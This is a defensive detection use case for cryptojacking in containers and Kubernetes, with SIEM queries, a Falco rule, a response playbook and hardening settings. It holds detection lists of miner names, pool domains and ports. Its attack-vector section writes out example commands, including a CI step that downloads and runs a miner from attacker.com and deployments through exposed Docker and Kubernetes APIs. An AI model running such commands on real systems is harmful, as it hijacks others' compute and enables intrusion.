# Container/Kubernetes - Cryptocurrency Mining in Containers

## Severity
**CRITICAL**

## Description
Detects cryptocurrency mining activities running inside containers or Kubernetes pods. This includes known mining software, connections to mining pools, high CPU/memory utilization patterns, and suspicious container deployments characteristic of cryptojacking operations.

## MITRE ATT&CK
- **Tactic**: Impact (TA0040), Resource Hijacking (TA0042), Execution (TA0002)
- **Technique**: Resource Hijacking (T1496), User Execution (T1204), Masquerading (T1036)
- **Container-Specific**: Deploy Container (T1610), Container Orchestration API (T1552.007)

## DEVO Query

```sql
from container.runtime
select eventdate
select hostname
select container_id
select container_name
select container_image
select namespace
select pod_name
select process_name
select command_line
select cpu_usage_percent
select memory_usage_mb
select network_connections
select count() as event_count
where (
    -- Known mining processes
    weakhas(process_name, "xmrig")
    or weakhas(process_name, "minergate")
    or weakhas(process_name, "cgminer")
    or weakhas(process_name, "bfgminer")
    or weakhas(process_name, "ethminer")
    or weakhas(process_name, "nanominer")
    or weakhas(process_name, "t-rex")
    or weakhas(process_name, "phoenixminer")
    or weakhas(process_name, "lolminer")
    or weakhas(process_name, "nbminer")
    or weakhas(process_name, "gminer")
    or weakhas(process_name, "kryptex")

    -- Command line indicators
    or weakhas(command_line, "stratum+tcp")
    or weakhas(command_line, "stratum+ssl")
    or weakhas(command_line, "--donate-level")
    or weakhas(command_line, "--algorithm")
    or weakhas(command_line, "cryptonight")
    or weakhas(command_line, "monero")
    or weakhas(command_line, "--pool")
    or weakhas(command_line, "--wallet")
    or weakhas(command_line, "randomx")
    or weakhas(command_line, "ethash")

    -- Obfuscated/renamed miners
    or (weakhas(command_line, "-o pool.") and weakhas(command_line, "-u"))
    or (weakhas(command_line, "--url") and weakhas(command_line, "--user"))
  )
  or (
    -- High CPU sustained usage (potential mining)
    cpu_usage_percent > 90
    and container_image not like "%approved-compute%"
  )
group by container_id, pod_name, namespace, container_image
every 5m
having event_count > 1 or cpu_usage_percent > 90
```

## Network-Based Detection

```sql
from network.connections
select eventdate
select src_ip
select dst_ip
select dst_port
select dst_domain
select bytes_sent
select bytes_received
select duration
select container_id
select pod_name
select namespace
select mm2country(dst_ip) as mining_pool_country
where (
    -- Known mining pool domains/IPs
    weakhas(dst_domain, "pool.")
    or weakhas(dst_domain, "mine.")
    or weakhas(dst_domain, "miner.")
    or weakhas(dst_domain, "mining")
    or weakhas(dst_domain, "xmr")
    or weakhas(dst_domain, "monero")
    or weakhas(dst_domain, "minergate")
    or weakhas(dst_domain, "nanopool")
    or weakhas(dst_domain, "ethermine")
    or weakhas(dst_domain, "f2pool")
    or weakhas(dst_domain, "sparkpool")
    or weakhas(dst_domain, "antpool")
    or weakhas(dst_domain, "slushpool")
    or weakhas(dst_domain, "nicehash")

    -- Common mining pool ports
    or `in`(3333, 4444, 5555, 7777, 8888, 9999, 14444, dst_port)
    or `in`(3000, 5000, 6666, 8080, 45560, dst_port)
  )
  and container_id is not null
group by container_id, dst_domain, dst_ip
every 5m
```

## Kubernetes Audit Detection

```sql
from kubernetes.audit
select eventdate
select user.username
select sourceIPs
select objectRef.namespace
select objectRef.name as pod_name
select requestObject.spec.containers.image as image
select requestObject.spec.containers.resources.requests as resource_requests
select requestObject.spec.containers.resources.limits as resource_limits
select responseStatus.code
where verb = "create"
  and objectRef.resource = "pods"
  and (
    -- Suspicious container images
    weakhas(str(requestObject.spec.containers.image), "xmrig")
    or weakhas(str(requestObject.spec.containers.image), "miner")
    or weakhas(str(requestObject.spec.containers.image), "alpine") and requestObject.spec.containers.command like "%wget%pool%"

    -- High resource requests (mining optimization)
    or (requestObject.spec.containers.resources.requests.cpu > "2000m"
        and requestObject.spec.containers.resources.requests.memory > "2Gi")

    -- No resource limits (greedy resource consumption)
    or (requestObject.spec.containers.resources.limits.cpu is null
        and requestObject.spec.containers.resources.requests.cpu > "500m")
  )
  and responseStatus.code < 300
group by user.username, objectRef.namespace, image
every 5m
```

## Alert Configuration
- **Trigger**: Known mining process OR mining pool connection OR sustained high CPU (>90% for >5 min)
- **Throttling**: 5 minute window, group by container_id and namespace
- **Severity**: Critical
- **Priority**: P1
- **Auto-Response**: Auto-terminate container if mining pool connection confirmed

## Recommended Actions
1. **IMMEDIATE**: Terminate the mining container/pod
   ```bash
   kubectl delete pod <pod-name> -n <namespace> --force --grace-period=0
   ```
2. Kill mining processes if pod termination fails
3. Block mining pool domains/IPs at network firewall
4. Identify how the miner was deployed (compromised credentials, vulnerable service, supply chain)
5. Review container image provenance - where did it come from?
6. Check for persistence mechanisms (DaemonSets, CronJobs, Deployments)
7. Audit ServiceAccount and RBAC permissions
8. Scan all nodes for additional mining processes
9. Review resource quotas and limit ranges
10. Check cloud billing for unexpected compute costs
11. Investigate user account that deployed the workload
12. Review admission controller logs (was policy bypassed?)
13. Hunt for lateral movement and additional compromised resources

## False Positive Considerations
- Legitimate compute-intensive workloads (ML training, rendering, scientific computing)
- Approved blockchain validation nodes
- Load testing or performance benchmarking
- Compiling software or CI/CD build processes
- Data processing pipelines (ETL, analytics)

**Tuning Recommendations**:
- Whitelist approved high-CPU workloads by namespace and ServiceAccount
- Exclude ML/AI training pods with specific labels
- Baseline normal CPU patterns for each namespace
- Create exceptions for approved blockchain infrastructure
- Implement resource quotas to limit cryptomining impact
- Require specific labels for high-resource workloads

## Enrichment Opportunities
- Cloud cost analysis (sudden spike in compute costs)
- Container image vulnerability scan results
- Registry pull history (when/where was image pulled from?)
- User/ServiceAccount creation date (newly created = suspicious)
- Historical deployments by the same user
- Network traffic analysis (bandwidth to mining pools)
- Process lineage (parent process that spawned miner)
- File system analysis (were mining binaries downloaded at runtime?)
- Correlation with exposed services (RDP, SSH, Docker API, Kubernetes API)

## Response Playbook

### Phase 1: Immediate Containment (0-5 minutes)
1. **Terminate Mining Containers**:
   ```bash
   # Find all suspicious pods
   kubectl get pods -A -o json | jq '.items[] | select(.status.containerStatuses[].ready==true) | select(.spec.containers[].resources.requests.cpu | tonumber > 2)'

   # Delete suspicious pods
   kubectl delete pod <pod-name> -n <namespace> --force --grace-period=0
   ```

2. **Block Mining Pool Networks**:
   ```bash
   # Kubernetes Network Policy
   kubectl apply -f - <<EOF
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: block-mining-pools
     namespace: <namespace>
   spec:
     podSelector: {}
     policyTypes:
     - Egress
     egress:
     - to:
       - ipBlock:
           cidr: 0.0.0.0/0
           except:
           - <mining-pool-ip>/32
   EOF
   ```

3. **Disable Compromised Credentials**:
   ```bash
   # Delete ServiceAccount if compromised
   kubectl delete serviceaccount <sa-name> -n <namespace>

   # Remove RBAC bindings
   kubectl delete rolebinding <binding-name> -n <namespace>
   ```

### Phase 2: Investigation (5-60 minutes)
1. **Identify Attack Vector**:
   - Check Kubernetes audit logs for pod creation events
   - Review authentication logs for unauthorized API access
   - Inspect exposed services (Docker API, Kubelet, Kubernetes API)
   - Check for vulnerable applications in the cluster

2. **Scope Assessment**:
   ```bash
   # Find all pods created by suspicious user/ServiceAccount
   kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.annotations."kubectl.kubernetes.io/last-applied-by"=="<user>") | [.metadata.namespace, .metadata.name] | @tsv'

   # Check for DaemonSets (persistence)
   kubectl get daemonsets -A

   # Check for CronJobs (scheduled mining)
   kubectl get cronjobs -A
   ```

3. **Cost Analysis**:
   - Review cloud provider billing for compute cost spikes
   - Calculate resource consumption:
     ```bash
     kubectl top pods -A --sort-by=cpu
     kubectl top nodes
     ```

### Phase 3: Eradication (1-4 hours)
1. **Remove All Malicious Resources**:
   ```bash
   # Delete deployments
   kubectl delete deployment <name> -n <namespace>

   # Delete DaemonSets
   kubectl delete daemonset <name> -n <namespace>

   # Delete CronJobs
   kubectl delete cronjob <name> -n <namespace>
   ```

2. **Patch Vulnerabilities**:
   - Update Kubernetes to latest version
   - Patch vulnerable container images
   - Fix exposed services (kubelet, Docker API)
   - Strengthen authentication (no anonymous access)

3. **Strengthen Security Controls**:
   - Implement Pod Security Standards (restricted)
   - Deploy admission controllers (OPA, Kyverno)
   - Enforce resource quotas and limit ranges
   - Enable audit logging
   - Deploy runtime security (Falco)

### Phase 4: Recovery & Prevention (4-24 hours)
1. **Resource Quotas**:
   ```yaml
   apiVersion: v1
   kind: ResourceQuota
   metadata:
     name: compute-quota
     namespace: production
   spec:
     hard:
       requests.cpu: "100"
       requests.memory: "200Gi"
       limits.cpu: "200"
       limits.memory: "400Gi"
   ```

2. **Limit Ranges**:
   ```yaml
   apiVersion: v1
   kind: LimitRange
   metadata:
     name: limit-range
     namespace: production
   spec:
     limits:
     - max:
         cpu: "2"
         memory: "4Gi"
       min:
         cpu: "100m"
         memory: "128Mi"
       type: Container
   ```

3. **Admission Control Policy**:
   ```yaml
   apiVersion: kyverno.io/v1
   kind: ClusterPolicy
   metadata:
     name: require-resource-limits
   spec:
     validationFailureAction: enforce
     rules:
     - name: require-limits
       match:
         resources:
           kinds:
           - Pod
       validate:
         message: "CPU and memory limits are required"
         pattern:
           spec:
             containers:
             - resources:
                 limits:
                   cpu: "?*"
                   memory: "?*"
   ```

4. **Runtime Detection (Falco)**:
   ```yaml
   - rule: Detect Crypto Miners
     desc: Detect cryptocurrency mining processes
     condition: >
       spawned_process and
       (proc.name in (xmrig, ethminer, minergate, cgminer, bfgminer) or
        proc.cmdline contains "stratum+tcp" or
        proc.cmdline contains "--donate-level")
     output: >
       Cryptocurrency miner detected
       (user=%user.name container=%container.id image=%container.image.repository
        process=%proc.name cmdline=%proc.cmdline)
     priority: CRITICAL
   ```

## Investigation Steps
1. **Timeline Reconstruction**:
   - When was the mining pod first deployed?
   - When did high CPU usage start?
   - When were mining pool connections established?
   - What user/ServiceAccount deployed the workload?

2. **Access Analysis**:
   - How did the attacker gain Kubernetes API access?
   - Were credentials stolen or exposed?
   - Was an application vulnerability exploited?
   - Was the Docker API or Kubelet API exposed?

3. **Impact Assessment**:
   - Total compute resources consumed
   - Cloud costs incurred
   - Duration of mining operation
   - Other resources deployed by the attacker

4. **Forensic Collection**:
   - Container image layers analysis
   - Pod logs and container stdout/stderr
   - Network traffic captures
   - Kubernetes audit logs
   - Node system logs

## Common Cryptojacking Attack Vectors

### 1. Exposed Kubernetes API
```bash
# Unauthenticated API access
curl -k https://<k8s-api>:6443/api/v1/namespaces/default/pods
# Deploy mining pod
kubectl run miner --image=<mining-image>
```

### 2. Exposed Docker API
```bash
# 2375/2376 exposed to internet
docker -H tcp://<host>:2375 run -d <mining-image>
```

### 3. Vulnerable Application
- Exploit web app to deploy mining container
- Container escape from compromised app container
- Supply chain attack via vulnerable base image

### 4. Compromised CI/CD Pipeline
```yaml
# Malicious .gitlab-ci.yml or Jenkinsfile
deploy:
  script:
    - kubectl run miner --image=alpine --command -- sh -c "wget http://attacker.com/miner && chmod +x miner && ./miner"
```

### 5. Malicious Helm Chart
```bash
# Trojanized Helm chart
helm install malicious-app ./chart
# Chart includes hidden mining DaemonSet
```

## Known Cryptojacking Campaigns
- **TeamTNT**: Docker/K8s focused, AWS credential theft + mining
- **Hildegard**: Kubernetes cryptojacking with rootkit
- **Kinsing**: Exploits web apps, deploys miners, disables security
- **Graboid**: Worm propagating via Docker API
- **Doki**: NGROK-based backdoor + cryptomining

## Mining Pool Indicators (IOCs)

**Common Mining Pools**:
- xmrpool.eu, minexmr.com, supportxmr.com (Monero)
- ethermine.org, nanopool.org, f2pool.com (Ethereum)
- pool.hashvault.pro, moneroocean.stream
- zpool.ca, mining-pool.com

**Common Mining Pool Ports**:
- 3333, 4444, 5555, 7777, 8888, 9999 (stratum)
- 14444, 45560 (secure stratum SSL)

**Monero Wallet Address Pattern**:
- Starts with "4" and is 95 characters long
- Example: 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

## Prevention Measures

### 1. Secure Kubernetes API
```yaml
# Disable anonymous auth
--anonymous-auth=false

# Enable RBAC
--authorization-mode=RBAC

# Restrict API access
apiVersion: v1
kind: Namespace
metadata:
  name: production
  annotations:
    net.alpha.kubernetes.io/network-policy: |
      {
        "ingress": {
          "isolation": "DefaultDeny"
        }
      }
```

### 2. Image Security
- Use private container registries
- Scan all images with Trivy/Clair before deployment
- Sign images with Cosign/Notary
- Implement image admission policies (only allow signed images)

### 3. Runtime Security
- Deploy Falco for runtime threat detection
- Enable SELinux/AppArmor/Seccomp
- Use read-only root filesystems
- Drop all capabilities except required ones

### 4. Resource Management
- Enforce ResourceQuotas on all namespaces
- Require LimitRanges for all pods
- Monitor resource usage with Prometheus/Grafana
- Alert on anomalous CPU/memory spikes

### 5. Network Security
- Implement default-deny NetworkPolicies
- Segment namespaces (multi-tenancy)
- Egress filtering (only allow required destinations)
- Monitor outbound connections

## Forensic Artifacts
- Container images (analyze layers for mining binaries)
- Kubernetes audit logs (pod creation, RBAC changes)
- Container logs (mining process output)
- Network connection logs (mining pool connections)
- Cloud billing records (cost spike evidence)
- Node system logs (process execution, CPU usage)
- Container runtime logs (containerd, CRI-O)

## Cost Impact
**Example Cryptojacking Cost**:
- 100 compromised pods × 2 CPU cores each = 200 CPU cores
- AWS EC2 c5.xlarge equivalent: $0.17/hour × 50 instances = $8.50/hour
- 30 days of mining = $6,120 in wasted compute costs
- Plus investigation, remediation, reputation damage

## Compliance & Legal
- **PCI-DSS**: Unauthorized software (6.2, 10.6)
- **SOC 2**: Unauthorized resource usage
- **GDPR**: Potential data access during compromise
- **Cloud Terms of Service**: Violation (account suspension risk)

## Business Impact
- **Unexpected Cloud Costs**: Thousands to millions in compute charges
- **Performance Degradation**: Legitimate workloads starved of resources
- **Service Outages**: Resource exhaustion causing pod evictions
- **Reputation Damage**: Customer trust erosion
- **Investigation Costs**: Security team time and incident response
- **Remediation Costs**: Infrastructure rebuild, security tooling

## Related Use Cases
- Container/Kubernetes - Privileged Container Escape
- Container/Kubernetes - Unauthorized Image Pull
- Container/Kubernetes - Suspicious Resource Spike
- Network - DNS Tunneling (mining pool discovery)
- ThreatIntelligence - IOC Match (mining pool IPs)

## Threat Intelligence Sources
- AlienVault OTX: Cryptomining IOCs
- Abuse.ch: Mining pool tracking
- Unit 42 Threat Reports: Cryptojacking campaigns
- CISA Alerts: Kubernetes security advisories

## References
- MITRE ATT&CK T1496: Resource Hijacking
- Kubernetes Security Best Practices
- CNCF Financial Container Security Guide
- TeamTNT Campaign Analysis (Trend Micro, Palo Alto Networks)
- NSA/CISA Kubernetes Hardening Guide

## Notes
- Cryptojacking is one of the most common container attacks
- Often the first stage of a larger attack (reconnaissance)
- Can go unnoticed for months if monitoring is inadequate
- Prevention through resource limits and admission control is critical
- Automated response (pod termination) is effective
- Always check for persistence mechanisms (DaemonSets, CronJobs)
- Investigate the initial access vector to prevent reinfection
